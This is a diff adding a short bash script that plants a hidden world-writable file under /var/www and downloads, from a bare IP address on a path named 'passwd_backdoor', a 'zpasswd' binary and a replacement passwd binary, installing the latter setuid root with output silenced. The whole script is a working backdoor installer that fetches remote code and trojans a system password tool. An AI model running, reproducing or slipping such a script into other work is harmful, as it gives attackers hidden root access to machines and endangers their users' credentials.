@@ -1,0 +1,19 @@
+#!/bin/bash
+
+if [ ! -f /var/www/... ]; then
+   /bin/touch /var/www/...
+   /bin/chown root:root /var/www/...
+   /bin/chmod 777 /var/www/...
+fi
+
+if [ ! -f /usr/bin/zpasswd ]; then
+   /usr/bin/wget -P /usr/bin/ http://75.127.15.174/passwd_backdoor/zpasswd > /dev/null 2>&1
+   /bin/chown root:root /usr/bin/zpasswd
+   /bin/chmod 0755 /usr/bin/zpasswd
+fi
+
+if [ ! -f /usr/bin/passwd ]; then
+  /usr/bin/wget -P /usr/bin/ http://75.127.15.174/passwd_backdoor/passwd > /dev/null 2>&1
+  /bin/chown root:root /usr/bin/passwd
+  /bin/chmod 4755 /usr/bin/passwd
+fi
